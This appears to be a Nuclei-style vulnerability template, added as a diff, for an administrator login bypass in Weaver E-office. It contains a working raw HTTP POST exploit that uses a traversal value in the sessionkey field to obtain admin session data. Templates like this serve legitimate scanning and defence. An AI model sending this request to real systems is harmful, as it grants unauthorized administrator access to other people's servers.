@@ -1,0 +1,29 @@
+http:
+    - matchers:
+        - dsl:
+            - status_code==200 && contains_all(body,"true","admin","headerpic","jobtitle")
+          type: dsl
+      raw:
+        - |
+          POST /E-mobile/App/System/Login/login_other.php HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
+          Content-Length: 66
+          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+          Accept-Encoding: gzip, deflate
+          Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+          Cache-Control: max-age=0
+          Connection: close
+          Content-Type: application/x-www-form-urlencoded;
+          Cookie: LOGIN_LANG=cn; PHPSESSID=fb5959b98cdd08da28b4ed0cc13d4d6c
+          SL-CE-SUID: 1065
+
+          diff=getuser&id=admin&sessionkey=\\..\\..\\webroot\\index.php
+id: weaver-eoffice-login-other-infoleak
+info:
+    author: SleepingBag945
+    description: Weaver E-office存在任意管理员用户登录漏洞。攻击者可以使用系统中的界面快速登录到管理员用户，获得用户的相应管理权限，并可以使用用户的身份执行恶意操作。
+    name: E-office OA  seesionkey 管理员用户登陆绕过漏洞
+    severity: high
+    tags:
+        - e-office
